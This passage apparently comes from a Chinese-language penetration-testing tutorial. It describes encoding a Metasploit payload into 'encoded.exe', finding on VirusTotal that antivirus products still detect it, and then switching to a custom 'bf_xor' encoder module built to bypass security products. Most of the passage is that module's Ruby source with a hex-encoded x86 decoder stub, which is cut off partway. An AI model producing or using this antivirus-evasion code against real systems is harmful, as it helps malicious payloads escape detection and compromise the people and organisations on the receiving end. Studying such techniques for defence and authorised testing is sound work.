  Saved as: encoded.exe\nmsf >\n```\n\n- 3. 为了验证你的有效载荷是否会被防病毒软件检测到，我们可以使用 VirusTotal：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_606_0.png)\n\n不幸的是，正如我所预期的那样，尽管我们对其进行了\
  \ 10 次编码，大多数防病毒软件仍会检测到我们的有效载荷。随着时间的推移，安全公司开始检测 Metasploit 中的默认编码器。但并非一切都完了；如果我们使用自定义编码器，我们仍然可以利用\
  \ Metasploit 来绕过安全产品。\n\n- 4. 在本教程中，我们将使用 François Profizi 创建的自定义编码器，该编码器使用对已知明文的暴力攻击来绕过安全产品：\n\
  \n```\n##\n# This module requires Metasploit:\nhttp://metasploit.com/download\n\
  # Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire\
  \ 'msf/core'\n\nclass MetasploitModule < Msf::Encoder\n\ndef initialize\nsuper(\n\
  'Name' => 'bf_xor',\n'Description' => '',\n'Author' => 'François Profizi',\n'Arch'\
  \ => ARCH_X86,\n'License' => MSF_LICENSE\n)\nend\n\ndef decoder_stub(state)\nstub\
  \ = \"\"\nstub << \"\\xEB\\x62\\x55\\x8B\\xEC\\x83\\xEC\\x18\\x8B\\x7D\\x10\\x8B\\\
  x75\\x0C\\x33\\xC0\\x89\\x45\\xFC\\x8B\"\nstub << \"\\xC8\\x83\\xB1\\x03\\x03\\\
  xC9\\x03\\xC9\\x03\\xC9\\x8B\\xDA\\xD3\\xFB\\x8A\\xCB\\x33\\xDB\\x39\\x5D\"\nstub\
  \ << \"\\x14\\x75\\x18\\x0F\\xB6\\x1E\\x0F\\xB6\\xC9\\x33\\xD9\\x8B\\x4D\\x08\\\
  x0F\\xB6\\x0C\\x08\\x3B\\xD9\"\nstub << \"\\x75\\x07\\xFF\\x45\\xFC\\xEB\\x02\\\
  x30\\x0E\\x40\\x46\\x3B\\xC7\\x7C\\xC8\\x3B\\x7D\\xFC\\x74\\x10\"\nstub << \"\\\
  x83\\x7D\\x14\\x01\\x74\\x06\\x42\\x83\\xFA\\xFF\\x72\\xAF\\x33\\xC0\\xEB\\x02\\\
  x8B\\xC2\\xC9\\xC3\"\nstub << \"\\x55\\x8B\\xEC\\x83\\xEC\\x10\\xEB\\x50\\x58\\\
  x89\\x45\\xFC\\xE7\\x58\\x8B\\x10\\x89\\x55\\xF8\"\nstub << \"\\x83\\xC0\\x04\\\
  x89\\x45\\xF4\\x33\\xDB\\x33\\xC0\\x50\\x6A\\x0A\\xFF\\x75\\xFC\\xFF\\x75\\xF4\\\
  xE8\"\nstub << \"\\x72\\xFF\\xFF\\xFF\\x85\\xC0\\x74\\x13\\x6A\\x01\\xFF\\x75\\\
  xF8\\xFF\\x75\\xFC\\xFF\\x75\\xF4\\xE8\"\nstub << \"\\x5E\\xFF\\xFF\\xFF\\xFF\\\
